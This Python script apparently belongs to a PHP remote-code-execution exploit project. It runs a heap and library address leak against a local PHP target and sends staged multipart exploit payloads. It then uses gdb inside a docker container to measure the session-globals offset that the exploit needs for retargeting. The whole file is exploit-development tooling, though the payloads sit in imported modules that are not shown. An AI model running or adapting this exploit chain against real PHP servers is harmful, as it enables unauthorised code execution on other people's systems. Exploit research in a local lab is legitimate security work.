#!/usr/bin/env python3
"""Measure the real stale PS(http_session_vars) offset on a display_errors=On +
expose_php=On target, and show what stage3 B actually returns.

Runs dev_on_rce's stage1 leak + def_rce's "on" stage3 A, then reads the worker's
.bss session globals with gdb (read-only, no breakpoints -> no int3 corruption)
and prints R0_seen = hsv_p - main_chunk.  Use with R0_OFF=... to retarget.
"""
import os
import re
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.join(HERE, os.pardir, "exploits"))
os.environ.setdefault("PROFILE", "on")
import exploit as E
import worker
import default_rce as D
import def_rce as N

URL = "http://127.0.0.1:%d/index.php" % int(os.environ.get("PORT", "8102"))
GDB = os.path.join(HERE, "gdb", "gdb-psdump.py")


def psdump(pid):
    out = subprocess.run(["docker", "exec", worker.container_name(), "sh", "-c",
                          "gdb -q -batch -p %d -x /srv/out/gdb-psdump.py 2>&1" % pid],
                         capture_output=True, text=True).stdout
    return out


def main():
    subprocess.run(["docker", "cp", GDB, worker.container_name() + ":/srv/out/gdb-psdump.py"],
                   check=True)
    t = E.Target(URL, timeout=300.0, verbose=False)
    cookie = D.stage1_leak(t)
    chunk, libphp, n = D.parse_bases(cookie)
    if not chunk or not libphp:
        print("LEAK_FAILED")
        return 1
    a = N.stage3_a_body()
    r = t.post(E.build_multipart(a, b"S" * 17), b"S" * 17,
               read_cap=1 << 20, timeout=300.0)
    head = r[:400].decode("latin1", "replace").replace("\r\\n", " | ")
    print("S3 A resp", len(r), flush=True)
    print("S3 A head", head[:300], flush=True)
    ws = worker.workers()
    print("workers", ws, flush=True)
    dump = psdump(ws[0]) if ws else "no worker"
    print(dump, flush=True)
    mm = re.search(r"main=(0x[0-9a-f]+)", dump)
    hp = re.search(r"hsv_p=(0x[0-9a-f]+)", dump)
    if mm and hp:
        main, hsv = int(mm.group(1), 16), int(hp.group(1), 16)
        print("R0_seen = %#x  (chunk-relative %#x, expected %#x)"
              % (hsv, hsv - main, N.R0_OFF), flush=True)
        print("chunk(main?) = %#x leaked chunk = %#x" % (main, chunk), flush=True)
    bp, htdata, zif = N.stage3_b_body(chunk, libphp)
    r2 = t.post(E.build_multipart(bp, b"B" * 10), b"B" * 10,
                read_cap=1 << 20, timeout=120.0)
    print("S3 B resp", len(r2), flush=True)
    print("S3 B tail", r2[-500:].decode("latin1", "replace"), flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
